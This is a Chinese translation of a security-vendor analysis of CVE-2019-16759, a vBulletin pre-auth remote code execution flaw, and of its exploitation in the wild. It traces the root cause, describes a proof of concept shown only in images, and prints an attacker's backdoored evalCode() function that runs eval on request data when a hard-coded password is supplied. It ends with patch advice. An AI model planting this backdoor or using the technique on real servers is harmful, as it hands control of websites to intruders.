> 原文链接: https://www.anquanke.com//post/id/189470 


# CVE-2019-16759漏洞在野利用


                                阅读量   
                                **718636**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者paloaltonetworks，文章来源：unit42.paloaltonetworks.com
                                <br>原文地址：[https://unit42.paloaltonetworks.com/exploits-in-the-wild-for-vbulletin-pre-auth-rce-vulnerability-cve-2019-16759/](https://unit42.paloaltonetworks.com/exploits-in-the-wild-for-vbulletin-pre-auth-rce-vulnerability-cve-2019-16759/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01c66e1b07f68c16f8.png)](https://p5.ssl.qhimg.com/t01c66e1b07f68c16f8.png)



研究人员发现vBulletin Pre-Auth漏洞的在野利用。

近期有研究人员公布了CVE-2019-16759 vBulletin 0 day漏洞的相关详情，Unit 42很快就发现了该漏洞的在野利用。通过利用该漏洞，未经过认证的攻击者可以获取运行在v 5.0.0- 5.5.4版本的vBulletin服务器的特权访问和控制。



## 漏洞根源分析

该漏洞是一个pre-auth（预认证）远程代码执行漏洞，CVSS V3.1评分为9.8。漏洞是vBulletin v 5.0.0版本中引入的一个Ajax渲染函数引发的PHP服务器端模板注入。<br>
首先看一下`index.php`的代码。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Entry-Point-of-the-vulnerability-index.php_-1.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Entry-Point-of-the-vulnerability-index.php_-1.png)

图 1. 漏洞的入口点(index.php)

代码会调用`vB5_Frontend_ApplicationLight::isQuickRoute()`来检查请求是不是`quick route`（快速路由）。使用的方法是位于`includes/vb5/frontend/applicationlight.php`的`isQuickRoute()`：

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-2.-isQuickRoute-function-900x614.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-2.-isQuickRoute-function-900x614.png)

图 2. isQuickRoute函数 (`includes/vb5/frontend/applicationlight.php`)

如图 2所示，如果在请求的开始部分有 `ajax/api`或`ajax/render` ，函数会返回`true`。然后，`vB5_Frontend_ApplicationLight`对象会被初始化，并根据图1执行。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-3.-Ajax-render-handler-includesvb5frontendapplicationlight.php_-900x586.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-3.-Ajax-render-handler-includesvb5frontendapplicationlight.php_-900x586.png)

图 3. Ajax render handler (`includes/vb5/frontend/applicationlight.php`)

图 3所示，当请求以`ajax/render`开始时，`handler`会被设置为`callRender`。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-callRender-renders-the-template-includesvb5frontendapplicationlight.php_-900x325.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-4.-callRender-renders-the-template-includesvb5frontendapplicationlight.php_-900x325.png)

图 4. callRender() 渲染模板 (`includes/vb5/frontend/applicationlight.php`)

图 4表明`callRender()`函数会使用来自`array_merge($_POST, $GET)`的`$routeInfo[2]`和`$params`中的名字来渲染模板。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Fig-5-1-900x268.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Fig-5-1-900x268.png)

图 5. `widget_php`模板 (c`ore/install/vbulletin-style.xml`)

图 5表明`vbulletin-style.xml`文件中有一个`widget_php`模板。根据该模板，如果`$widgetConfig[‘code’]`不为空， `$vboptions[‘disable_php_rendering’]`也被禁用了，就会执行如下代码：

```
`{`vb:action evaledPHP, bbcode, evalCode, `{`vb:raw 
widgetConfig.code`}``}`
               `{`vb:raw $evaledPHP`}`
```

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-6.-evalCode-function.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-6.-evalCode-function.png)

图 6. evalCode()函数 (includes/vb5/frontend/controller/bbcode.php)

图 6所示是`evalCode()`函数的代码，`$code`中的文本会直接由于PHP`eval()`函数执行。

如果用`params`参数构建请求：

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/word-image-3.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/word-image-3.png)



## POC

根据分析，研究人员构建了漏洞利用代码来执行该功能。因为参数`routestring` 是来自`$_REQUEST`的，所以可以通过`$_GET`, `$_POST`,`$_COOKIE HTTP`等方法发送。`widgetConfig[code]`可以通过`$_GET, $_POST`方法发送。因此，可以构建如下的PoC，并通过GET或POST请求发送：

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/PoC-Code.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/PoC-Code.png)

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-7.-Vulnerability-demonstrated-through-a-GET-request-900x733.jpeg)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-7.-Vulnerability-demonstrated-through-a-GET-request-900x733.jpeg)

图 7. 通过GET请求证明漏洞

图 7 表明PoC通过GET请求发送时间运行了`phpinfo()`。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-8.-PoC-through-POST-request-900x456.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-8.-PoC-through-POST-request-900x456.png)

图 8. 通过POST请求实现PoC

图 8表明PoC通过POST请求发送时显示的`phpinfo()`。



## 在野漏洞利用

研究人员已经检测到多个该漏洞的在野利用尝试。

如图9所示，攻击者尝试执行`die([@md5](https://github.com/md5)(HellovBulletin))`来确定服务器是否有漏洞，但是由于请求中多个一个`=`（等号），所以漏洞利用就失败了。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-9.-POST-request-for-the-failed-exploit-attempt-900x399.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-9.-POST-request-for-the-failed-exploit-attempt-900x399.png)

图 9. 失败漏洞利用的POST请求示例

图 10表明攻击者尝试在web root目录中创建`webconfig.txt.php`。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-10.-POST-request-for-exploit-modifying-webconfig.txt.php_-900x259.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-10.-POST-request-for-exploit-modifying-webconfig.txt.php_-900x259.png)

图 10. 尝试通过POST请求修改`webconfig.txt.php`的漏洞利用

图 11表明`webconfig.txt.php`的内容和一个一行的PHP webshell，允许攻击者来发送任意命令或由主机执行。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-11.-Content-after-base64-decode.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-11.-Content-after-base64-decode.png)

图 11. base64解码后的内容

图 12攻击者尝试覆写`bbcode.php`文件的例子。

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-12.-Attacker-tries-to-overwrite-the-bbcode.php_.png)](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-12.-Attacker-tries-to-overwrite-the-bbcode.php_.png)

图 12. 攻击者尝试覆写`bbcode.php`文件

如果成功的话，`evalCode()`就会返回以下代码：

```
function evalCode($code)
`{`
ob_start();if (isset($_REQUEST["epass"]) &amp;&amp; $_REQUEST["epass"] == "2dmfrb28nu3c6s9j") `{` eval($code);`}`
$output = ob_get_contents();
ob_end_clean();
return $output;
`}`
```

通过以上内容，在`“epass”`通过请求中的值 `“2dmfrb28nu3c6s9j”`发送时，被黑的站点会执行`evalCode()`函数的代码。这样可以防止攻击者控制被黑的站点，允许僵尸网络C2服务器将该漏洞利用排除在外，并向目标服务器发送命令。



## 结论

截至目前，研究人员已经发现了该 vBulletin 漏洞的漏洞利用。

研究人员建议管理员尽快更新 vBulletin到version 5.5.2/3/4 Patch Level 1 ，或在管理面板中禁用`PHP, Static HTML, Ad Module rendering`设置。
